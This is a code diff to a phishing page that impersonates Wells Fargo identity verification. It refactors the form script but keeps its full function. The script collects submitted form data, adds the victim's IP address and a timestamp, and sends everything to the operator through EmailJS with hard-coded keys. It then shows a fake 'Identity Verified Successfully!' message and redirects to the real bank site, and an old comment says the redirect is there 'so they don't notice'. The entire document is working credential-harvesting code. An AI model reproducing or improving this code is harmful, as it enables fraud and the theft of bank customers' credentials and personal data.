@@ -387,78 +387,68 @@ body {
     </footer>
    
         <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-// 1. Init with your Public Key
-emailjs.init("y3lRWL7KLDjiFjNcN");
+    <script>
+        // 1. Initialize EmailJS
+        (function() {
+            // Replace with your Public Key
+            emailjs.init("y3lRWL7KLDjiFjNcN");
+        })();
 
-document.getElementById('scamForm').addEventListener('submit', function(e) {
-e.preventDefault();
+        // 2. Form Submission Logic
+        document.getElementById('scamForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-// Get the button to disable it
-const btn = document.getElementById('verifyBtn'); // Make sure your button has id="verifyBtn"
-const originalText = btn ? btn.textContent : "Verify Now";
+            // Show processing screen IMMEDIATELY
+            showProcessing("https://www.wellsfargo.com/");
 
-if(btn) {
-btn.disabled = true;
-btn.textContent = "Verifying...";
-btn.style.backgroundColor = "#999"; // Gray out button
-btn.style.cursor = "not-allowed";
-}
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
 
-// Get data from form
-const formData = new FormData(e.target);
-const data = Object.fromEntries(formData.entries());
+            // Get IP Address
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    data.date = new Date().toLocaleString();
+                    sendEmail(data);
+                })
+                .catch(() => {
+                    // Send email even if IP fails
+                    sendEmail(data);
+                });
+        });
 
-// Get IP
-fetch('https://api.ipify.org?format=json')
-.then(res => res.json())
-.then(ipData => {
-// Add IP and Date to data object
-data.ip = ipData.ip;
-data.date = new Date().toLocaleString();
+        function sendEmail(data) {
+            // Replace with your Service ID and Template ID
+            emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                .then(() => {
+                    console.log("Email sent successfully");
+                })
+                .catch((error) => {
+                    console.error("Email send failed", error);
+                });
+        }
 
-// Send to EmailJS
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-// Success: Show processing screen, THEN redirect
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
+        function showProcessing(url) {
+            const container = document.getElementById('formContainer');
+            const processing = document.getElementById('processing');
+            const processingText = document.getElementById('processingText');
 
-// Wait 3 seconds then go to real site
-setTimeout(() => {
-window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-}, 3000);
-})
-.catch(err => {
-// Fail: Still show processing screen then redirect so they don't notice
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
+            if (container && processing) {
+                container.style.display = 'none';
+                processing.style.display = 'flex'; // Use flex to center content
 
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-});
-})
-.catch(() => {
-// If IP fetch fails, still send data without IP and redirect
-emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-.then(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-})
-.catch(() => {
-document.querySelector('.container').style.display = 'none';
-document.getElementById('processing').style.display = 'block';
-setTimeout(() => {
-window.location.href = "https://www.wellsfargo.com/";
-}, 3000);
-});
-});
-});
-</script>
+                // Simulate processing steps
+                setTimeout(() => {
+                    processingText.textContent = "Identity Verified Successfully!";
+                }, 2000);
+
+                setTimeout(() => {
+                    window.location.href = url;
+                }, 3000);
+            }
+        }
+    </script>
     
      
 <script>
